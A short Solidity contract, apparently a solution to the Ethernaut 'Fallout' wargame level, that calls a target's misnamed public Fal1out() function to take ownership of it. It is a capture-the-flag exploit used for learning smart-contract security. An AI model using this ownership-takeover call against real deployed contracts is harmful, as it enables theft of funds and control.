// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutAttack {

    function attack(address target) external payable{
        
        IFallout falloutattack = IFallout(target);

        falloutattack.Fal1out();
    }
}
